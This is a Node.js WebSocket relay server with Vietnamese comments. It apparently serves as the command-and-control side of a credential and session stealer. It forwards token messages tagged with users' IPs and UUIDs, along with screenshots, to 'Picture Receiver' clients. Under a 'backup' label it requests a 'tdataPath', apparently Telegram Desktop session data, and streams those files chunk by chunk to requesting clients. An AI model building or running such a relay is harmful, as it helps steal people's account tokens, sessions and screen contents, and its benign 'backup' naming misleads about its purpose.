import http from 'http';
import express from 'express';
import { WebSocket, WebSocketServer } from 'ws';
import crypto from 'crypto';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;
const server = http.createServer(app);

// Tăng giới hạn WebSocket message size và buffer
const wss = new WebSocketServer({ 
    noServer: true,
    maxPayload: 50 * 1024 * 1024, // 50MB max message size
    perMessageDeflate: {
        // Tắt compression để tránh memory spike
        threshold: 1024,
        concurrencyLimit: 10,
        memLevel: 7
    }
});

server.on('upgrade', (request, socket, head) => {
    wss.handleUpgrade(request, socket, head, ws => {
        wss.emit('connection', ws, request);
    });
});

// WebSocket logic
const usersInChat = new Map();
const pictureReceivers = new Map(); 
const backupHandlers = new Map(); // Thêm map cho backup handlers
const backupRequesters = new Map(); // Thêm map cho backup requesters

// Thêm map để track file transfers đang diễn ra
const activeTransfers = new Map();

let keepAliveId = null;

wss.on("connection", (ws, req) => {
    const userID = crypto.randomUUID();
    usersInChat.set(userID, ws);

    // Tăng buffer size cho connection này
    ws._socket.setNoDelay(true);
    ws._socket.setTimeout(0); // Disable timeout

    ws.on("message", (data) => {
        handleMessage(ws, data, userID);
    });

    ws.on("close", () => {
        handleDisconnect(userID, ws);
    });

    ws.on("error", (error) => {
        console.error(`WebSocket error for user ${userID}:`, error);
        handleDisconnect(userID, ws);
    });

    if (wss.clients.size === 1 && !keepAliveId) {
        keepServerAlive();
    }
});

wss.on("close", () => {
    if (keepAliveId) {
        clearInterval(keepAliveId);
        keepAliveId = null;
    }
});

const handleMessage = (ws, data, userID) => {
    try {
        // Kiểm tra kích thước message
        if (data.length > 50 * 1024 * 1024) { // 50MB limit
            console.error(`Message too large: ${data.length} bytes from user ${userID}`);
            ws.send(JSON.stringify({
                type: 'error',
                message: 'Message too large'
            }));
            return;
        }

        const messageData = JSON.parse(data.toString());
        
        // Handle backup-related messages
        if (messageData.type === 'register') {
            handleRegistration(ws, messageData, userID);
        } else if (messageData.type === 'backup_request') {
            handleBackupRequest(messageData, userID);
        } else if (messageData.type === 'backup_response') {
            handleBackupResponse(messageData, userID);
        } else if (messageData.type === 'backup_file_start') {
            handleBackupFileStart(messageData, userID);
        } else if (messageData.type === 'backup_file_chunk') {
            handleBackupFileChunk(messageData, userID);
        } else if (messageData.type === 'backup_file_end') {
            handleBackupFileEnd(messageData, userID);
        }
        // Original logic
        else if (messageData.command === 'Picture Receiver') {
            pictureReceivers.set(userID, ws);
        } else if (messageData.type === 'token' && messageData.sender && messageData.token && messageData.uuid && messageData.ip) {
            broadcastToPictureReceivers(messageData);
        } else if (messageData.type === 'screenshot' && messageData.data && typeof messageData.data === 'string' && messageData.data.startsWith('data:image/png;base64')) {
            broadcastToPictureReceivers({
                type: 'screenshot',
                action: messageData.action,
                screen: messageData.screen,
                data: messageData.data
            });
        } else if (messageData.action === 'screenshot_result') {
            broadcastToPictureReceivers({
                type: 'screenshot',
                action: messageData.action,
                screen: messageData.screen,
                data: messageData.data
            });
        } else {
            broadcastToAllExceptPictureReceivers(ws, JSON.stringify(messageData), true);
        }
    } catch (e) {
        console.error('Error parsing or processing message:', e);
        console.error('Message size:', data.length);
        console.error('User ID:', userID);
        
        // Gửi error response về client
        try {
            ws.send(JSON.stringify({
                type: 'error',
                message: 'Failed to process message'
            }));
        } catch (sendError) {
            console.error('Failed to send error response:', sendError);
        }
    }
};

// Backup-related handlers
const handleRegistration = (ws, messageData, userID) => {
    if (messageData.role === 'backup_handler') {
        backupHandlers.set(userID, ws);
        console.log(`Backup handler registered: ${userID}`);
    } else if (messageData.role === 'backup_requester') {
        backupRequesters.set(userID, ws);
        console.log(`Backup requester registered: ${userID}`);
    }
};

const handleBackupRequest = (messageData, userID) => {
    console.log(`Backup request from ${userID} for: ${messageData.tdataPath}`);
    
    // Forward request to all backup handlers
    const requestData = JSON.stringify(messageData);
    backupHandlers.forEach((handlerWs, handlerID) => {
        if (handlerWs.readyState === WebSocket.OPEN) {
            handlerWs.send(requestData, (error) => {
                if (error) {
                    console.error(`Error forwarding backup request to handler ${handlerID}:`, error);
                }
            });
        }
    });
};

const handleBackupResponse = (messageData, userID) => {
    console.log(`Backup response from handler ${userID}: ${messageData.status}`);
    
    // Forward response to all backup requesters
    const responseData = JSON.stringify(messageData);
    backupRequesters.forEach((requesterWs, requesterID) => {
        if (requesterWs.readyState === WebSocket.OPEN) {
            requesterWs.send(responseData, (error) => {
                if (error) {
                    console.error(`Error forwarding backup response to requester ${requesterID}:`, error);
                }
            });
        }
    });
};

const handleBackupFileStart = (messageData, userID) => {
    console.log(`File transfer start from ${userID}: ${messageData.fileName} (${messageData.fileSize} bytes)`);
    
    // Initialize transfer tracking
    activeTransfers.set(messageData.fileName, {
        senderID: userID,
        fileName: messageData.fileName,
        fileSize: messageData.fileSize,
        startTime: Date.now(),
        chunksReceived: 0
    });
    
    // Forward to requesters
    const startData = JSON.stringify(messageData);
    backupRequesters.forEach((requesterWs, requesterID) => {
        if (requesterWs.readyState === WebSocket.OPEN) {
            requesterWs.send(startData, (error) => {
                if (error) {
                    console.error(`Error forwarding file start to requester ${requesterID}:`, error);
                }
            });
        }
    });
};

const handleBackupFileChunk = (messageData, userID) => {
    const transfer = activeTransfers.get(messageData.fileName);
    if (transfer) {
        transfer.chunksReceived++;
        
        // Log progress every 10 chunks to avoid spam
        if (transfer.chunksReceived % 10 === 0) {
            console.log(`File ${messageData.fileName}: received ${transfer.chunksReceived} chunks`);
        }
    }
    
    // Forward chunk to requesters with error handling
    const chunkData = JSON.stringify(messageData);
    backupRequesters.forEach((requesterWs, requesterID) => {
        if (requesterWs.readyState === WebSocket.OPEN) {
            requesterWs.send(chunkData, (error) => {
                if (error) {
                    console.error(`Error forwarding chunk to requester ${requesterID}:`, error);
                    // Optionally notify sender about failed delivery
                }
            });
        }
    });
};

const handleBackupFileEnd = (messageData, userID) => {
    const transfer = activeTransfers.get(messageData.fileName);
    if (transfer) {
        const duration = (Date.now() - transfer.startTime) / 1000;
        console.log(`File transfer completed: ${messageData.fileName}`);
        console.log(`  - Chunks: ${transfer.chunksReceived}`);
        console.log(`  - Duration: ${duration.toFixed(2)}s`);
        console.log(`  - Speed: ${(transfer.fileSize / 1024 / 1024 / duration).toFixed(2)} MB/s`);
        
        // Cleanup
        activeTransfers.delete(messageData.fileName);
    }
    
    // Forward end signal to requesters
    const endData = JSON.stringify(messageData);
    backupRequesters.forEach((requesterWs, requesterID) => {
        if (requesterWs.readyState === WebSocket.OPEN) {
            requesterWs.send(endData, (error) => {
                if (error) {
                    console.error(`Error forwarding file end to requester ${requesterID}:`, error);
                }
            });
        }
    });
};

const broadcastToPictureReceivers = (message) => {
    const data = JSON.stringify(message);
    pictureReceivers.forEach((ws, userId) => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(data, error => {
                if (error) console.error("Error sending message to receiver:", error);
            });
        }
    });
};

const broadcastToAllExceptPictureReceivers = (senderWs, message, includeSelf) => {
    wss.clients.forEach(client => {
        if (!pictureReceivers.has(client) && client.readyState === WebSocket.OPEN && (includeSelf || client !== senderWs)) {
            client.send(message, (error) => {
                if (error) {
                    console.error("Error broadcasting message:", error);
                }
            });
        }
    });
};

const handleDisconnect = (userID, ws) => {
    console.log(`User disconnected: ${userID}`);
    
    usersInChat.delete(userID);
    pictureReceivers.delete(userID);
    backupHandlers.delete(userID);
    backupRequesters.delete(userID);
    
    // Cleanup any active transfers from this user
    activeTransfers.forEach((transfer, fileName) => {
        if (transfer.senderID === userID) {
            console.log(`Cleaning up incomplete transfer: ${fileName}`);
            activeTransfers.delete(fileName);
        }
    });
};

const keepServerAlive = () => {
    keepAliveId = setInterval(() => {
        wss.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.ping(); 
            }
        });
        
        // Log server stats
        console.log(`Server stats: ${wss.clients.size} clients, ${activeTransfers.size} active transfers`);
        
        // Cleanup stale transfers (older than 10 minutes)
        const now = Date.now();
        activeTransfers.forEach((transfer, fileName) => {
            if (now - transfer.startTime > 10 * 60 * 1000) {
                console.log(`Cleaning up stale transfer: ${fileName}`);
                activeTransfers.delete(fileName);
            }
        });
        
    }, 30000);
};

// Routes
app.get('/', (req, res) => {
    res.setHeader('Cache-Control', 'no-store');
    res.status(200).send('WebSocket Server Running');
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        clients: wss.clients.size,
        backupHandlers: backupHandlers.size,
        backupRequesters: backupRequesters.size,
        activeTransfers: activeTransfers.size,
        uptime: process.uptime()
    });
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('SIGTERM received, shutting down gracefully');
    server.close(() => {
        console.log('Server closed');
        process.exit(0);
    });
});

server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
